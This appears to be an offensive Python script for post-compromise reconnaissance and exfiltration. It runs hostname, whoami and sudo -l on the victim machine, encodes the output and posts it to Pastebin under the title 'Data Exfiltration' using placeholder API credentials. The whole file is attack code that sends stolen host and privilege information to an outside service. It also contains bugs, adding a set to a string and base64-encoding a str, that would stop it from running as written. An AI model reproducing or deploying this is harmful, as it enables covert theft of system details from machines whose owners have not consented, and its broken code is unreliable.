import subprocess
import base64
import requests
import sys

hostname = subprocess.Popen('hostname', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = hostname.communicate()
hostname_result = stdout.decode()

user = subprocess.Popen('whoami', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = user.communicate()
user_result = stdout.decode()

privilege = subprocess.Popen('sudo -l', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = privilege.communicate()
privilege_result = stdout.decode()

result = "Exfiltration result :\nHostname : "+hostname_result+"\nUser : "+user_result+"\nPrivilege : "+{privilege_result}

# pastebin credentials
dev_key = 'dev_key' # change to dev_key

creds = {
    'api_dev_key': dev_key,
    'api_user_name': 'username',
    'api_user_password': 'password'
}

data = {
    'api_option' : 'paste',
    'api_dev_key': dev_key,
    'api_paste_code': base64.b64encode(result),
    'api_paste_name': "Data Exfiltration",
    'api_user_key': None,
}

try:
    login = requests.post("https://pastebin.com/api/api_login.php", data=creds)
    data['api_user_key'] = login.text
except Exception as e:
    print(e)
    sys.exit()


try:
    paste = requests.post("https://pastebin.com/api/api_post.php", data=data)
    print(f"Result stored in : {paste.text}")
except Exception as e:
    print(e)
    sys.exit()
